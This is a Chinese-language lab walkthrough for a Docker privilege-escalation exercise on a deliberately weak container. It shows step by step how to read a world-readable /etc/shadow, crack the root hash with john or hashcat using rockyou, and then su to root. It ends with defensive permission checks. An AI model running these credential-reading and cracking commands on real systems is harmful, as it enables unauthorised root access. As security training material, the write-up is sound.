# /etc/shadow 可读提权（john 破解）

## 原理

/etc/shadow 存放所有用户密码哈希，正常权限 640（仅 root 和 shadow 组可读）。
当 shadow 对普通用户可读（644 等）时，把哈希抄走离线破解（john/hashcat），
破解出 root 密码即可 su root。真实环境中 root 密码往往复用其他服务密码，
且用户常使用弱密码。

## 环境

- 基础镜像：ubuntu:20.04（内置 john）
- 低权限用户：lowpriv / lowpriv123
- root 弱密码：password123
- 漏洞配置：/etc/shadow 权限 644

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/shadow-readable        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it shadow-readable su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. 确认权限并读取哈希
ls -l /etc/shadow
# 预期: -rw-r--r-- (644, 可读!)
cat /etc/shadow | grep '^root'

# 2. 合并成 john 格式
unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt

# 3. john 破解
echo -e 'password123\n123456\ntoor\nadmin' > /tmp/dict.txt
john --wordlist=/tmp/dict.txt /tmp/hashes.txt
# 预期: password123 (root)   破解成功!

# 4. 登录 root
echo password123 | su root -c 'id'
# 预期: uid=0(root)   提权成功!
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：理解 /etc/shadow 格式

```
root:$6$riekpK4m$uBdaAyK0j...:18226:0:99999:7:::
 用户名  哈希                      最后修改 最小 最大 警告 ...
```

哈希前缀标识算法：
| 前缀 | 算法 |
|:---|:---|
| `$1$` | MD5-crypt |
| `$5$` | SHA-256-crypt |
| `$6$` | SHA-512-crypt（现代默认） |
| `$y$` | yescrypt（新系统） |

密码哈希是**单向函数**：无法解密，只能"猜一个密码 → 算哈希 → 对比"，
这就是暴力破解的本质。

### 第二步：unshadow 合并文件（关键一步）

```bash
unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt
```

为什么需要 unshadow：john 需要把 passwd 的 UID/GID/家目录信息（root:0:0:root:/root:/bin/bash）
与 shadow 的哈希合并成一行完整记录，才能正确解析。

### 第三步：john 破解

```bash
echo -e 'password123\n123456\ntoor\nadmin' > /tmp/dict.txt
john --wordlist=/tmp/dict.txt /tmp/hashes.txt
# 预期: password123 (root)
```

john 的破解模式：
1. **字典模式**（--wordlist）：拿字典里每个词做哈希对比——最快
2. 单模式（--single）：用用户名、注释信息变形猜测
3. 增量/暴力模式：穷举字符组合——最慢

### 第四步：查看全部破解结果

```bash
john --show /tmp/hashes.txt
```

### 第五步：登录

```bash
echo password123 | su root -c 'id'
# 预期: uid=0(root)
```

### 真实环境提效

- 完整字典：`/usr/share/wordlists/rockyou.txt`（Kali 自带，解压后 1400 万词条）
- GPU 加速：`hashcat -m 1800 -a 0 root.hash rockyou.txt`（-m 1800 = SHA-512-crypt）
- root 密码往往复用网站/服务密码，可从已拿到的其他凭据联想

为什么能成功

- unshadow 把 /etc/passwd 和 /etc/shadow 合并成 john 认识的格式
- 演示环境 root 密码故意设为弱密码 password123，john 秒破
- 攻击机可用 hashcat 加速：hashcat -m 1800 -a 0 root.hash rockyou.txt

## 防御

- /etc/shadow 权限必须为 640（属主 root:shadow）
- 强密码策略，避免弱口令
- 定期检查：stat -c '%a %U %G %n' /etc/shadow


## 扩展教学（网络搜索整理）

### john 的三种破解模式

```bash
# 1. 单模式 (最快, 用用户名/注释猜)
john --single /tmp/hashes.txt

# 2. 字典模式 (本环境用)
john --wordlist=/tmp/dict.txt /tmp/hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt

# 3. 增量/暴力模式 (最慢, 穷举)
john --incremental /tmp/hashes.txt
```

### 查看已破解结果

```bash
john --show /tmp/hashes.txt
# root:password123:0:0:root:/root:/bin/bash
```

### hashcat 加速（攻击机 GPU）

```bash
# 提取 root 哈希
grep '^root' /etc/shadow | cut -d: -f2 > root.hash
# $6$ 开头是 SHA-512 -> hashcat 模式 1800
hashcat -m 1800 -a 0 root.hash /usr/share/wordlists/rockyou.txt
# $1$ 开头是 MD5-crypt -> 模式 500
hashcat -m 500 -a 0 root.hash rockyou.txt
```

### 密码哈希为什么不能"解密"

哈希是单向函数：只能"猜密码→算哈希→对比"，不能反向还原。
所以破解的本质是猜词 + 算哈希 + 比对，字典质量决定成败。
rockyou.txt（Kali 自带，解压后 1400 万条）是标准字典：
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 检测与防御

- shadow 权限 640（root:shadow），passwd 644
- 强制强密码策略（弱口令是 root 原因）
- 定期审计：stat -c '%a %U %G %n' /etc/shadow

## 验证记录

2026-08-26 真实环境验证：john 输出 `password123 (root)`，破解成功，
`su root` 提权成功。
